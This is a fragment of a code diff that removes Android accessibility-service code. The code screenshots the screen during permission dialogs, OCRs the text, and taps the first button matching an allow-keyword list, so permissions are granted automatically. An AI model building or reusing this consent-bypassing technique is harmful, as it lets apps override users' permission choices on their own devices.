-                    Log.e(TAG, "OCR scanner error: " + e.getMessage());
-                }
-                if (ocrScanActive && ocrScanHandler != null) {
-                    ocrScanHandler.postDelayed(this, 700);
-                }
-            }
-        };
-        // 1 s initial delay so the permission dialog has time to render
-        ocrScanHandler.postDelayed(ocrScanRunnable, 1000);
-        Log.i(TAG, "OCR permission scanner STARTED (API 30+, 700 ms interval)");
-    }
-
-    /** Stops the OCR scanner and cancels any pending callback. */
-    private void stopOcrPermissionScanner() {
-        ocrScanActive = false;
-        if (ocrScanHandler != null && ocrScanRunnable != null) {
-            ocrScanHandler.removeCallbacks(ocrScanRunnable);
-        }
-        Log.i(TAG, "OCR permission scanner STOPPED");
-    }
-
-    /**
-     * Runs ML Kit text recognition on {@code bitmap}, then taps the first text
-     * line that matches an allow-keyword and does not match any deny-keyword.
-     *
-     * Coordinate mapping: AccessibilityService.takeScreenshot() returns a
-     * hardware buffer at the display's native resolution, which is then copied
-     * to a software ARGB_8888 bitmap. The width/height of that bitmap equals the
-     * physical screen dimensions, so ML Kit bounding-box pixels map 1:1 to screen
-     * pixels. A safety scale factor is computed anyway in case a device downscales.
-     *
-     * Only one tap is dispatched per call (the first matching button found top-to-
-     * bottom, left-to-right). The next 700 ms poll handles any follow-up dialogs.
-     */
-    @RequiresApi(api = Build.VERSION_CODES.R)
-    private void processScreenshotForGrant(final Bitmap bitmap) {
-        try {
-            com.google.mlkit.vision.common.InputImage image =
-                    com.google.mlkit.vision.common.InputImage.fromBitmap(bitmap, 0);
-
-            final CountDownLatch latch = new CountDownLatch(1);
-            final AtomicReference<com.google.mlkit.vision.text.Text> resultRef =
-                    new AtomicReference<>();
-
-            getOrCreateOcrRecognizer().process(image)
-                    .addOnSuccessListener(text -> {
-                        resultRef.set(text);
-                        latch.countDown();
-                    })
-                    .addOnFailureListener(e -> {
-                        Log.w(TAG, "OCR recognition failed: " + e.getMessage());
-                        latch.countDown();
-                    });
-
-            if (!latch.await(2000, TimeUnit.MILLISECONDS)) {
-                Log.w(TAG, "OCR timed out after 2 s");
-                return;
-            }
-
-            com.google.mlkit.vision.text.Text result = resultRef.get();
-            if (result == null || result.getTextBlocks().isEmpty()) return;
-
-            // Scale factor: bitmap pixels → physical screen pixels (usually 1.0)
-            float scaleX = bitmap.getWidth()  > 0 ? (float) screenWidth  / bitmap.getWidth()  : 1f;
-            float scaleY = bitmap.getHeight() > 0 ? (float) screenHeight / bitmap.getHeight() : 1f;
-
-            for (com.google.mlkit.vision.text.Text.TextBlock block : result.getTextBlocks()) {
-                for (com.google.mlkit.vision.text.Text.Line line : block.getLines()) {
-                    String raw = line.getText().trim();
-                    String low = raw.toLowerCase(java.util.Locale.ROOT);
-
-                    // Reject deny-keywords first
-                    boolean deny = false;
-                    for (String dk : OCR_DENY_KEYWORDS) {
-                        if (low.contains(dk)) { deny = true; break; }
-                    }
-                    if (deny) continue;
-
-                    // Accept if the line equals, starts with, or ends with an allow-keyword
-                    boolean allow = false;
-                    for (String ak : OCR_ALLOW_KEYWORDS) {
-                        if (low.equals(ak)
-                                || low.startsWith(ak + " ")
-                                || low.endsWith(" " + ak)) {
-                            allow = true;
-                            break;
-                        }
-                    }
-                    if (!allow) continue;
-
-                    android.graphics.Rect bounds = line.getBoundingBox();
-                    if (bounds == null) continue;
-
-                    float cx = bounds.centerX() * scaleX;
-                    float cy = bounds.centerY() * scaleY;
-
-                    // Reject coordinates outside the visible screen
-                    if (cx < 1 || cy < 1 || cx > screenWidth - 1 || cy > screenHeight - 1) continue;
-
-                    Log.i(TAG, "OCR tap → \"" + raw + "\" at (" + (int)cx + ", " + (int)cy + ")");
-                    performClick(cx, cy);
-                    return; // one tap per scan cycle
-                }
-            }
-        } catch (InterruptedException ie) {
-            Thread.currentThread().interrupt();
-        } catch (Exception e) {
-            Log.e(TAG, "processScreenshotForGrant error: " + e.getMessage());
-        }
     }
 
     /**
